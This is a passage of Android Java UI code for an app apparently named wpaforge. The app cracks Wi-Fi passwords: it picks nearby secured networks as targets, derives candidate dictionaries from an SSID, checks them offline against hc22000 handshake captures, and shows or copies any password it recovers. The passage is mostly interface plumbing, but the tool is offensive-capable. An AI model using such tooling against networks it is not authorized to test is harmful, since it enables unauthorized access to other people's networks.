                    Toast.LENGTH_SHORT).show();
            return;
        }
        List<String> labels = new ArrayList<>();
        final List<NetRecord> sel = new ArrayList<>();
        for (NetRecord r : lastRecords) {
            if (r.security == NetRecord.Security.OPEN) continue;
            labels.add(r.displayName() + "  (" + r.rssi + "dBm)");
            sel.add(r);
        }
        if (sel.isEmpty()) {
            Toast.makeText(this, L.s("扫描结果里没有加密网络",
                    "No secured networks in the scan results"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        final NetRecord[] arr = sel.toArray(new NetRecord[0]);
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("选择要派生的目标", "Pick a target to derive from"))
                .setItems(labels.toArray(new String[0]), (d, which) -> {
                    targetNet = arr[which];
                    Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                    updateTargetLabel();
                    refreshSkippedForCurrentDict();
                    deriveFromTarget(toAudit);
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    /**
     * 写一条记录到「其他审计操作」频道（历史调用点的兼容入口）。
     *
     * <p>1.9.44 起运行记录分成四个频道。恢复配置、旧派生清理、字典管理页的提示等
     * 既不属于「离线校验」也不属于「字典操作」，统一落到 {@code other}，
     * 不再污染离线校验频道；材料导入走 {@code auditLine}，字典操作走 {@code dictLine}。
     */
    private void appendLog(String line) {
        runLog.other.add(System.currentTimeMillis(),
                io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO, "", line, null);
        renderChannelRecords();
    }

    /**
     * 渲染日志：时间戳暗色、正文按级别上色。
     *
     * <p><b>只有本来就在底部时才自动滚底</b> —— 用户手动往上翻看历史时，
     * 新的一行不该把他拽回去。
     */
    private void renderLog(java.util.List<io.github.wlmosv_png.wpaforge.audit.RunLog.Line> lines,
                           TextView target, ScrollView scroll, String emptyHint) {
        if (target == null) return;
        boolean stayBottom = true;
        if (scroll != null && scroll.getChildAt(0) != null) {
            View child = scroll.getChildAt(0);
            stayBottom = scroll.getScrollY() + scroll.getHeight() >= child.getHeight() - 8;
        }
        if (lines.isEmpty()) {
            target.setText(emptyHint);
            target.setTextColor(AmberTheme.TEXT_FAINT);
            return;
        }
        android.text.SpannableStringBuilder sb = new android.text.SpannableStringBuilder();
        for (io.github.wlmosv_png.wpaforge.audit.RunLog.Line ln : lines) {
            int s0 = sb.length();
            sb.append(ln.clock());
            sb.setSpan(new android.text.style.ForegroundColorSpan(AmberTheme.TEXT_FAINT),
                    s0, sb.length(), android.text.Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            sb.append("  ");
            int s1 = sb.length();
            sb.append(ln.text);
            sb.setSpan(new android.text.style.ForegroundColorSpan(logColor(ln.kind)),
                    s1, sb.length(), android.text.Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            sb.append("\n");
        }
        target.setTextColor(AmberTheme.TERM_FG);
        target.setText(sb);
        if (stayBottom && scroll != null) {
            final ScrollView sc = scroll;
            sc.post(() -> sc.fullScroll(View.FOCUS_DOWN));
        }
    }

    /** 请求停止：调真正的 engine.cancel()，并说明「已请求、等退出」，不假报成功。 */
    private void stopOfflineRun() {
        io.github.wlmosv_png.wpaforge.audit.AuditEngine eng = runningEngine;
        if (eng == null) {
            // 没有引擎可停（可能任务属于上一次会话的实例）—— 也要给用户一句话，
            // 不能点了没反应。
            auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO,
                    L.s("当前实例没有正在运行的引擎（任务可能来自上一次会话）。",
                            "This instance holds no running engine (the task may belong to a "
                                    + "previous session)."));
            renderInflight();
            return;
        }
        eng.cancel();
        io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.markCancel(
                System.currentTimeMillis());
        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.CANCEL,
                L.s("已请求停止，等待引擎退出…", "Stop requested, waiting for the engine to exit..."));
        // 取消是协作式的：引擎只在遍历候选时检查标志位。若线程被系统冻结或阻塞，
        // 它会一直不返回 —— 没有看门狗的话界面上的"运行中"永远不解锁，
        // 开始按钮永久置灰、停止也无效，只能杀进程。
        startStallWatchdog();
    }

    /** 每秒一次：取消后超时未退出就强制解锁，并如实写一条「已取消（强制解锁）」。 */
    private final Runnable stallTick = new Runnable() {
        @Override public void run() {
            if (!offlineBusy
                    && !io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.held()) return;
            long now = System.currentTimeMillis();
            if (io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard
                    .stalled(now, io.github.wlmosv_png.wpaforge.audit
                            .OfflineRunGuard.DEFAULT_STALL_MS)) {
                long waited = io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard
                        .DEFAULT_STALL_MS / 1000L;
                io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.forceRelease();
                offlineBusy = false;
                runningEngine = null;
                workbench.endRun();
                io.github.wlmosv_png.wpaforge.OfflineRunStore.clearInflight(MainActivity.this);
                auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.CANCEL, "",
                        L.f("引擎在 %d 秒内没有退出，界面已强制解锁。这一轮既不是命中也不是未命中。",
                                "The engine did not exit within %d s; the UI was force-unlocked. "
                                        + "This run is neither a hit nor a miss.", waited),
                        L.s("原因：取消是协作式的，线程被系统冻结或阻塞时不会立刻返回。",
                                "Reason: cancellation is cooperative - a frozen or blocked thread "
                                        + "will not return promptly."));
                setVerdict(verdictOf(
                        io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.CANCELLED,
                        lastEntry, frozenMaterialName, workbench.dictionary(),
                        offlineLastTested, 0, "",
                        L.f("引擎未在 %d 秒内退出（已强制解锁）",
                                "engine did not exit within %d s (force-unlocked)", waited)));
                renderAudit();
                renderOfflineVerdict();
                return;
            }
            ui.postDelayed(this, 1000L);
        }
    };

    private void startStallWatchdog() {
        ui.removeCallbacks(stallTick);
        ui.postDelayed(stallTick, 1000L);
    }

    private void stopStallWatchdog() {
        ui.removeCallbacks(stallTick);
    }

    // ---- 结果卡 ----

    /** 状态 -> 颜色。 */
    private int verdictColor(io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State st) {
        switch (st) {
            case HIT:          return AmberTheme.OK;
            case MISS:         return AmberTheme.WARN;
            case CANCELLED:    return AmberTheme.ACCENT_SOFT;
            case BAD_MATERIAL: return AmberTheme.WARN;
            case FAILED:       return AmberTheme.DANGER;
            default:           return AmberTheme.TEXT_DIM;
        }
    }

    /** 状态 -> 标题。 */
    private String verdictLabel(io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v) {
        switch (v.state) {
            case HIT:          return L.s("✓ 命中", "✓ Hit");
            case MISS:         return L.s("✗ 未命中（字典已跑完）", "✗ No hit (dictionary exhausted)");
            case CANCELLED:    return L.s("■ 已取消（未跑完，不能算未命中）",
                                          "■ Cancelled (incomplete - not a miss)");
            case BAD_MATERIAL: return L.s("⚠ 材料异常（未执行）", "⚠ Material problem (not executed)");
            case FAILED:       return L.s("✗ 执行失败", "✗ Failed");
            default:           return L.s("最近结果", "Last result");
        }
    }

    /** 写结果：存模型 + 持久化 + 刷新界面（总览、结果卡、步骤状态一起走）。 */
    private void setVerdict(io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v) {
        lastVerdict = v;
        io.github.wlmosv_png.wpaforge.OfflineRunStore.save(this, v);
        renderOfflineVerdict();
        renderAudit();
    }

    private View kvRow(String k, String val) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        TextView kk = new TextView(this);
        kk.setText(k);
        kk.setTextSize(AmberTheme.FS_SMALL);
        kk.setTextColor(AmberTheme.TEXT_FAINT);
        kk.setMinWidth(px(56));
        row.addView(kk);
        TextView vv = new TextView(this);
        vv.setText(val);
        vv.setTextSize(AmberTheme.FS_SMALL);
        vv.setTextColor(TEXT_DIM);
        vv.setLineSpacing(px(3), 1f);
        row.addView(vv, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        return row;
    }

    private String fmtStamp(long epochMs) {
        if (epochMs <= 0) return "—";
        return new java.text.SimpleDateFormat("MM-dd HH:mm:ss", java.util.Locale.ROOT)
                .format(new java.util.Date(epochMs));
    }

    /** 命中口令的默认显示：固定掩码（只露长度区间，不露任何内容）。 */
    private String maskPw(String s) {
        int n = Math.max(6, Math.min(16, s == null ? 0 : s.length()));
        return new String(new char[n]).replace('\0', '\u2022');
    }

    /** 命中行：密码默认隐藏，可显示 / 复制。 */
    private View hitRow(final io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackground(roundBgStatic(AmberTheme.OK_BG, AmberTheme.RADIUS_CHIP));
        box.setPadding(px(14), px(12), px(14), px(12));

        final TextView pw = new TextView(this);
        pw.setTextSize(AmberTheme.FS_ACTION);
        pw.setTextColor(AmberTheme.OK);
        pw.setTypeface(Typeface.MONOSPACE);
        pw.setText(maskPw(v.hitPassword));
        box.addView(pw);

        LinearLayout btns = new LinearLayout(this);
        btns.setOrientation(LinearLayout.HORIZONTAL);
        final Button toggle = AmberTheme.action(this, dp, L.s("显示", "Reveal"), AmberTheme.BTN_NEUTRAL);
        final boolean[] shown = {false};
        toggle.setOnClickListener(x -> {
            shown[0] = !shown[0];
            pw.setText(shown[0] ? v.hitPassword : maskPw(v.hitPassword));
            toggle.setText(L.s(shown[0] ? "隐藏" : "显示", shown[0] ? "Hide" : "Reveal"));
        });
        Button copy = AmberTheme.action(this, dp, L.s("复制", "Copy"), AmberTheme.BTN_NEUTRAL);
        copy.setOnClickListener(x -> {
            try {
                android.content.ClipboardManager cm = (android.content.ClipboardManager)
                        getSystemService(CLIPBOARD_SERVICE);
                if (cm != null) {
                    cm.setPrimaryClip(android.content.ClipData.newPlainText("wpaforge", v.hitPassword));
                    Toast.makeText(this, L.s("已复制", "Copied"), Toast.LENGTH_SHORT).show();
                }
            } catch (Throwable ignored) {
            }
        });
        LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        blp.rightMargin = px(10);
        btns.addView(toggle, blp);
        btns.addView(copy);
        box.addView(btns, topGap(8));
        return box;
    }

    /**
     * 渲染常驻结果卡。
     *
     * <p>比 1.9.43 多两样东西：**字典来源 + 内容指纹/文件指纹**，以及未命中时的
     * 明确解释。没有指纹时事后只能看到"07 通用口令榜 · 3336 条"，
     * 无法回答"这次跑的到底是哪一份内容"。
     */
    private void renderOfflineVerdict() {
        if (offResult == null) return;
        offResult.removeAllViews();
        final io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v = lastVerdict;

        TextView title = new TextView(this);
        title.setTextSize(AmberTheme.FS_ACTION);
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));

        if (!v.hasResult()) {
            // 「盘上存过但解不开」必须和「从没跑过」分开说，否则用户以为结果凭空消失。
            title.setText(verdictLoadFailed
                    ? L.s("\u26a0 上次的结果记录损坏了（已忽略）",
                          "\u26a0 The stored result was corrupted (ignored)")
                    : L.s("还没有跑过", "No run yet"));
            title.setTextColor(verdictLoadFailed ? AmberTheme.WARN : AmberTheme.TEXT_DIM);
            offResult.addView(title);
            TextView hint = new TextView(this);
            hint.setText(L.s("跑一次之后，结论、材料、字典与耗时会固定显示在这里，"
                            + "切换页面或重开应用都不会丢。",
                    "After one run the verdict, material, dictionary and timing stay here "
                            + "across page switches and restarts."));
            hint.setTextSize(AmberTheme.FS_SMALL);
            hint.setTextColor(AmberTheme.TEXT_FAINT);
            hint.setLineSpacing(px(4), 1f);
            offResult.addView(hint, topGap(6));
            return;
        }

        int color = verdictColor(v.state);
        title.setText(verdictLabel(v));
        title.setTextColor(color);
        offResult.addView(title);

        // ★ 这条结果与「当前材料 / 当前字典」是否同源，必须写在最显眼的位置。
        //   否则用户看到的就是「页面上有个 1937/13255，不知道跑的是不是我手上这份」。
        io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Match match = resultMatch(v);
        if (match != io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Match.NO_RESULT) {
            offResult.addView(matchBadge(match, v), topGap(8));
            if (match != io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Match.SAME
                    && workbench.canStart()) {
                Button again = rowAction(L.s("用当前选择再跑一次", "Run again with the current pick"));
                again.setOnClickListener(x -> startOfflineRun());
                offResult.addView(again, topGap(6));
            }
        }

        String mat = v.fileName;
        String ms = v.materialSummary();
        if (!ms.isEmpty()) mat = mat + "  ·  " + ms;
        offResult.addView(kvRow(L.s("结果用的材料", "Material used"), mat), topGap(6));
        offResult.addView(kvRow(L.s("材料摘要", "Digest"), v.materialKind.isEmpty()
                ? "\u2014" : v.materialKind
                + (v.ssid.isEmpty() ? "" : " · SSID " + v.ssid)), topGap(3));
        offResult.addView(kvRow(L.s("字典", "Dictionary"),
                (v.dictName.isEmpty() ? L.s("(未命名)", "(unnamed)") : v.dictName)
                        + "  ·  " + v.dictSize + L.s(" 条", " entries")), topGap(3));
        offResult.addView(kvRow(L.s("字典来源", "Dict source"),
                v.dictSource.isEmpty() ? "\u2014" : sourceLabel(v.dictSource)), topGap(3));
        offResult.addView(kvRow(L.s("字典指纹", "Dict id"),
                v.dictFingerprint.isEmpty() ? "\u2014" : v.dictFingerprint), topGap(3));
        offResult.addView(kvRow(L.s("文件指纹", "File id"),
                v.dictFileId.isEmpty() ? L.s("未落盘", "not on disk") : v.dictFileId), topGap(3));
        offResult.addView(kvRow(L.s("完成", "Tested"),
                v.tested + " / " + v.dictSize + "  (" + pct(v.tested, v.dictSize) + ")"), topGap(3));
        offResult.addView(kvRow(L.s("耗时", "Elapsed"), fmtDuration(v.elapsedMs)), topGap(3));
        offResult.addView(kvRow(L.s("完成时间", "Finished"), fmtStamp(v.finishedAt)), topGap(3));

        if (!v.note.isEmpty()) {
            TextView n = new TextView(this);
            n.setText(v.note);
            n.setTextSize(AmberTheme.FS_SMALL);
            n.setTextColor(color);
            n.setLineSpacing(px(4), 1f);
            offResult.addView(n, topGap(6));
        }

        if (v.state == io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.HIT) {
            offResult.addView(hitRow(v), topGap(10));
        }

        // 未命中必须解释清楚"这只代表什么"，否则用户会以为密码一定很安全。
        if (v.state == io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.MISS) {
            TextView ex = new TextView(this);
            ex.setText(L.s(
                    "本次字典中的候选口令均未匹配，不代表目标密码不存在于其他字典"
                            + "或其他候选集合中。",
                    "None of the candidates in this dictionary matched. That does not mean the "
                            + "password is absent from other dictionaries or candidate sets."));
            ex.setTextSize(AmberTheme.FS_SMALL);
            ex.setTextColor(TEXT_DIM);
            ex.setLineSpacing(px(4), 1f);
            ex.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
            ex.setPadding(px(13), px(11), px(13), px(11));
            offResult.addView(ex, topGap(8));
        }
        if (v.state == io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.CANCELLED) {
            TextView ex = new TextView(this);
            ex.setText(L.s("这次没有跑完字典，什么结论都下不了 —— 既不是命中，也不是未命中。",
                    "The dictionary was not exhausted, so nothing can be concluded - it is neither "
                            + "a hit nor a miss."));
            ex.setTextSize(AmberTheme.FS_SMALL);
            ex.setTextColor(TEXT_DIM);
            ex.setLineSpacing(px(4), 1f);
            offResult.addView(ex, topGap(8));
        }

        offResult.addView(kvRow(L.s("结果标识", "Run id"),
                resultIdOf(v)), topGap(8));

        if (lastReport != null) {
            Button detail = rowAction(L.s("查看材料详情", "Material details"));
            detail.setOnClickListener(x -> showMaterialDetail());
            offResult.addView(detail, topGap(10));
        }
        Button clear = rowAction(L.s("清除这条结果", "Clear this result"));
        clear.setOnClickListener(x -> {
            lastReport = null;
            lastEntry = null;
            setVerdict(io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.none());
            renderOfflineVerdict();
        });
        offResult.addView(clear, topGap(2));
    }

    /** 当前选中的材料与最近一次结果是同一份吗（材料 + 字典两个维度）。 */
    private io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Match resultMatch(
            io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v) {
        io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e = lastEntry;
        int idx = workbench.selectedIndex();
        boolean picked = e != null && idx >= 0 && workbench.materialImported();
        return workbench.matchOf(v,
                picked ? workbench.materialName() : "",
                picked ? kindOf(e) : "",
                picked ? e.ssidLabel() : "",
                picked ? io.github.wlmosv_png.wpaforge.audit.Hc22000.hexMac(e.apMac) : "");
    }

    /** 一致性徽标：一句话说清这条结果与当前选择的关系。 */
    private View matchBadge(io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Match m,
                            io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v) {
        String text;
        int fg, bg;
        String curMat = workbench.materialImported()
                ? L.f("%s（%s）", "%s (%s)", workbench.materialName(),
                      lastEntry == null ? "-" : kindOf(lastEntry))
                : L.s("当前没有选中任何材料", "no material selected now");
        String resMat = L.f("%s（%s）", "%s (%s)",
                v.fileName.isEmpty() ? L.s("(未记录)", "(unrecorded)") : v.fileName,
                v.materialKind.isEmpty() ? "-" : v.materialKind);
        switch (m) {
            case SAME:
                text = L.s("\u2713 这条结果就是当前材料 + 当前字典，可以直接采信。",
                        "\u2713 This result uses the material and dictionary selected right now.");
                fg = AmberTheme.OK;
                bg = AmberTheme.OK_BG;
                break;
            case MATERIAL_CHANGED:
                text = L.s("\u26a0 这条结果不是当前材料：结果来自 " + resMat
                                + "；现在选中的是 " + curMat
                                + "。要看当前材料的结果，请再跑一次。",
                        "\u26a0 This result is NOT for the current material: it came from "
                                + resMat + "; you have " + curMat + " selected now. Run again "
                                + "for the current material.");
                fg = AmberTheme.WARN;
                bg = AmberTheme.WARN_BG;
                break;
            case DICT_CHANGED:
                text = L.s("\u26a0 字典已更换：这条结果用的是「"
                                + io.github.wlmosv_png.wpaforge.audit.AuditWorkflow
                                        .verdictDictLabelFull(v)
                                + "」；当前字典是「" + workbench.currentDictLabel() + "」。",
                        "\u26a0 The dictionary changed: this result used \""
                                + io.github.wlmosv_png.wpaforge.audit.AuditWorkflow
                                        .verdictDictLabelFull(v)
                                + "\"; the current one is \""
                                + workbench.currentDictLabel() + "\".");
                fg = AmberTheme.WARN;
                bg = AmberTheme.WARN_BG;
                break;
            case BOTH_CHANGED:
                text = L.s("\u26a0 材料与字典都已更换：这条结果来自 " + resMat + " + 「"
                                + io.github.wlmosv_png.wpaforge.audit.AuditWorkflow
                                        .verdictDictLabelFull(v) + "」。",
                        "\u26a0 Both changed: this result came from " + resMat + " + \""
                                + io.github.wlmosv_png.wpaforge.audit.AuditWorkflow
                                        .verdictDictLabelFull(v) + "\".");
                fg = AmberTheme.WARN;
                bg = AmberTheme.WARN_BG;
                break;
            default:
                // NO_RESULT 到不了这里（调用方已经挡掉），给一句中性兜底而不是留空。
                text = L.s("这条结果与当前选择的关系无法判断。",
                        "The relation to your current selection cannot be decided.");
                fg = AmberTheme.TEXT_DIM;
                bg = AmberTheme.SUNKEN;
                break;
        }
        TextView t = new TextView(this);
        t.setText(text);
        t.setTextSize(AmberTheme.FS_SMALL);
        t.setTextColor(fg);
        t.setLineSpacing(px(4), 1f);
        t.setBackground(roundBgStatic(bg, AmberTheme.RADIUS_CHIP));
        t.setPadding(px(13), px(11), px(13), px(11));
        return t;
    }

    /** 结果的可追溯标识：状态 + 字典指纹 + 完成时间，三点定位一次运行（不含密码）。 */
    private static String resultIdOf(io.github.wlmosv_png.wpaforge.audit.OfflineVerdict v) {
        String id = v.dictFingerprint.isEmpty() ? "--------" : v.dictFingerprint;
        return v.state.name() + " · " + id + " · " + v.finishedAt;
    }

    /** 材料详情弹窗：字段 + 完整度诊断。 */
    private void showMaterialDetail() {
        io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Report rep = lastReport;
        if (rep == null) return;
        StringBuilder sb = new StringBuilder();
        sb.append(rep.summary()).append("\n\n");
        for (String[] f : rep.facts) {
            sb.append(f[0]).append(": ").append(f[1]).append("\n");
        }
        if (!rep.warnings.isEmpty()) {
            sb.append("\n").append(L.s("警告:", "Warnings:")).append("\n");
            for (String w : rep.warnings) sb.append("· ").append(w).append("\n");
        }
        if (!rep.blockers.isEmpty()) {
            sb.append("\n").append(L.s("阻断项:", "Blockers:")).append("\n");
            for (String b : rep.blockers) sb.append("· ").append(b).append("\n");
        }
        io.github.wlmosv_png.wpaforge.ui.NetDialog.textInfo(this,
                L.s("材料详情", "Material details"), sb.toString());
    }

    /** 用材料里的 SSID 派生字典 —— 必须经用户确认，绝不擅自换字典。 */
    private void confirmDeriveFromMaterial() {
        final io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e = lastEntry;
        if (e == null || e.ssid == null || e.ssid.isEmpty()) return;
        if (!e.ssidExact) {
            // 非 UTF-8 的 SSID 不能用文本派生；说明原因，而不是静默产出乱码候选。
            io.github.wlmosv_png.wpaforge.ui.NetDialog.info(this,
                    L.s("这条 SSID 不能用于派生", "This SSID cannot be used for derivation"),
                    L.s("它的 SSID 不是合法 UTF-8（常见于中文路由器，如 GBK 编码），"
                                    + "按文本派生只会产出乱码候选。\n\n"
                                    + "离线校验本身不受影响 —— 材料和口令比对用的是原始字节。\n"
                                    + "需要字典的话，用「更换字典」选一本，或「内置生成器」造一本通用表。",
                            "Its SSID is not valid UTF-8 (common on Chinese routers, e.g. GBK), "
                                    + "and text derivation would only produce garbage candidates.\n\n"
                                    + "The offline check itself is unaffected - the material and "
                                    + "candidates are compared using the raw bytes.\n"
                                    + "For a dictionary, use \"Change dictionary\" or the built-in "
                                    + "generator."));
            return;
        }
        new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                L.s("按此目标派生字典", "Derive a dictionary from this target"),
                L.f("将把当前字典替换为按「%s」派生的候选。\n"
                                + "当前字典: %s（%d 条）\n\n确定要替换吗？",
                        "This replaces the current dictionary with candidates derived from \"%s\".\n"
                                + "Current: %s (%d entries)\n\nProceed?",
                        e.ssid,
                        currentDictName.isEmpty() ? L.s("未命名", "unnamed") : currentDictName,
                        dictCount()))
                .setPositive(L.s("派生并替换", "Derive and replace"), d -> deriveForSsid(e.ssid))
                .setNegative(L.s("取消", "Cancel"), null)
                .show();
    }

    /**
     * 按材料里的 SSID 派生候选并替换当前字典。
     *
     * <p>材料是从别处抓来的，本机未必扫到过这个 SSID，所以造一个最小 NetRecord
     * （只有 SSID，其余留空）喂给同一条 {@code TargetDictBuilder} —— 与破解页
     * 「按目标派生」共用实现，行为不会两头漂移。
     *
     * <p><b>必须经用户确认才会走到这里</b>，且会覆盖当前字典，所以调用方要先弹确认。
     */
    private void deriveForSsid(final String ssid) {
        if (ssid == null || ssid.isEmpty()) return;
        usePlanMode = false;
        selectedPlan = null;
        // 线索在**点击那一刻**读一次并固定下来（与「按目标派生」同一条纪律）：
        // 线程里再读就可能与用户看到的状态不一致。
        final io.github.wlmosv_png.wpaforge.audit.SeedModel seeds = seedModelForSsid(ssid);
        dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO,
                L.s("材料 SSID", "capture SSID"),
                L.f("正在按材料 SSID「%s」派生…",
                        "Deriving candidates from capture SSID \"%s\"...", ssid), null);
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.core.NetRecord fake =
                    new io.github.wlmosv_png.wpaforge.core.NetRecord(
                            ssid, "", -127, 2437,
                            io.github.wlmosv_png.wpaforge.core.NetRecord.Security.UNKNOWN,
                            false, "");
            // **必须带 SeedModel**（见 seedModelForSsid 的注释）：SSID 派生在
            // TargetDictBuilder 里是「seeds != null && seeds.useSsid」才生效的。
            // 旧实现调的是两参重载（seeds == null），于是「按材料 SSID 派生」
            // 实际产出的是与 SSID 毫无关系的通用弱口令表。
            final io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.Result r =
                    io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(
                            fake, Prefs.deriveBudget(this), null, seeds,
                            io.github.wlmosv_png.wpaforge.audit.CnHot.load(this));
            // 落盘前**不**按本目标的 triedSet 过滤：材料是从别处抓来的，
            // 它对应的网络不一定是破解页当前选中的那个；拿别的网络的已试集合
            // 去剔候选会静默丢料（这正是"界面显示 A、实际跑 B"的一类来源）。
            final java.util.List<Candidate> fresh =
                    new java.util.ArrayList<>(r.candidates);
            final String nm = io.github.wlmosv_png.wpaforge.audit.DerivedDicts
                    .targetedName(ssid, "");
            final String path = saveDictToFile(fresh, nm);
            final int n = fresh.size();
            ui.post(() -> {
                if (n == 0) {
                    // 派生失败/为空：**当前字典原样不动**，不留半截状态。
                    dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.WARN,
                            ssid, L.s("派生结果为空，当前字典保持不变。",
                                    "Derivation produced nothing; dictionary unchanged."), null);
                    Toast.makeText(this, L.s("派生结果为空，字典保持不变",
                            "Derivation produced nothing; dictionary unchanged"),
                            Toast.LENGTH_SHORT).show();
                    return;
                }
                applyDict(fresh, nm, path, SRC_PROFILE);
                dictLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK, nm,
                        L.f("已按「%s」派生 %d 条并替换当前字典（离线校验将使用这一本）",
                                "Derived %d candidates from \"%s\"; the offline check will use "
                                        + "this dictionary",
                                ssid, n),
                        L.f("文件: %s\n内容指纹: %s\n文件指纹: %s%s",
                                "File: %s\nContent id: %s\nFile id: %s%s",
                                path.isEmpty() ? L.s("未落盘（写入失败）",
                                        "not on disk (write failed)") : path,
                                workbench.dictionary().fingerprint(),
                                workbench.dictionary().fileId().isEmpty()
                                        ? "\u2014" : workbench.dictionary().fileId(),
                                r.explanation.isEmpty() ? "" : "\n" + r.explanation));
            });
        }, "wpaforge-derive-from-material").start();
    }

    // ---------------- 试连页 ----------------

    /**
     * 破解页。
     *
     * 布局分三段：
     *   顶部  三行紧凑状态（目标 / 字典 / 执行方式）+ 进度条  —— 固定，不随滚动
     *   中部  候选流                                        —— 唯一可滚动区
     *   底部  开始 / 暂停 / 停止                              —— 固定，永远可见
     *
     * 这样做的原因：跑起来之后用户最常做的是「看进度」和「按停止」，
     * 这两个都不该需要先滚动才能看到。
     */
    /**
     * 破解页 —— Obsidian Amber 重构。
     *
     * <h3>结构（自上而下四张卡）</h3>
     * <pre>
     *   ① 网络信息卡   第一层 名称 + 安全类型胶囊；第二层 信号 · 信道 · 频段 · 执行通道
     *   ② 字典卡       名称 + 条数
     *   ③ 任务进度卡   当前状态（大字） + 完成度（超大数字） + 已完成/总数 + 进度条 + 速率/剩余
     *   ④ 状态与事件卡 当前候选（等宽大字） + 攻击流工具条 + 可滚动日志 + 空状态引导
     *   ⑤ 底部操作卡   开始（琥珀）/ 暂停（中性）/ 停止（克制红） + 可用性说明
     * </pre>
     *
     * <h3>约束</h3>
     * 所有字段名、点击回调、日志筛选语义、按钮回调**与改版前完全一致** ——
     * 这一版只重排布局、统一配色与尺寸，不碰任何业务逻辑。
     */
    private void buildConnectTab() {
        final float R = AmberTheme.RADIUS_CARD;

        // ================= ① 网络信息卡 =================
        LinearLayout netCard = AmberTheme.card(this, dp, R);

        LinearLayout netTop = new LinearLayout(this);
        netTop.setOrientation(LinearLayout.HORIZONTAL);
        netTop.setGravity(Gravity.CENTER_VERTICAL);

        connectTargetView = new TextView(this);
        connectTargetView.setTextSize(AmberTheme.FS_TITLE);
        connectTargetView.setTextColor(TEXT);
        connectTargetView.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        // 长网络名必须能截断：改版前它和 dBm/ch/安全类型挤在一行，
        // 名字一长就把右边的指标挤出屏幕。
        connectTargetView.setSingleLine(true);
        connectTargetView.setEllipsize(TextUtils.TruncateAt.END);
        connectTargetView.setOnClickListener(v -> showTargetPicker());
        netTop.addView(connectTargetView, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        netSecChip = new TextView(this);
        netSecChip.setTextSize(AmberTheme.FS_LABEL);
        netSecChip.setTextColor(ACCENT);
        netSecChip.setLetterSpacing(0.06f);
        netSecChip.setPadding(px(9), px(3), px(9), px(3));
        netSecChip.setBackground(roundBg(AmberTheme.ACCENT_BG, AmberTheme.RADIUS_CHIP));
        netSecChip.setVisibility(View.GONE);
        LinearLayout.LayoutParams secLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        secLp.leftMargin = px(10);
        netTop.addView(netSecChip, secLp);

        // 「?」说明入口：放在第一张卡的顶行最右 —— 那是视线的第一落点，
        // 又用弱灰小图标不抢主按钮的位置（它是"说明"，不是操作）。
        ImageView help = new ImageView(this);
        help.setImageDrawable(DictIcons.sized(DictIcons.Kind.HELP,
                AmberTheme.ACCENT, dp, 20f));
        help.setContentDescription(L.s("说明", "Help"));
        // 显式尺寸，不用 WRAP_CONTENT —— 上一版就是栽在这里：
        // DictIcons 没有 intrinsic size 时 ImageView 按 0 测量，图标只剩几个像素
        help.setPadding(px(9), px(9), px(9), px(9));
        help.setBackground(roundBg(AmberTheme.CARD_3, AmberTheme.RADIUS_CHIP));
        LinearLayout.LayoutParams hlp = new LinearLayout.LayoutParams(px(38), px(38));
        hlp.leftMargin = px(8);
        help.setLayoutParams(hlp);
        help.setOnClickListener(v -> showCrackHelp());
        netTop.addView(help);

        netCard.addView(netTop);

        // 第二层：信号 · 信道 · 频段（等宽，数字能对齐）
        netMetaView = new TextView(this);
        netMetaView.setTextSize(AmberTheme.FS_BODY);
        netMetaView.setTextColor(AmberTheme.TEXT_DIM);
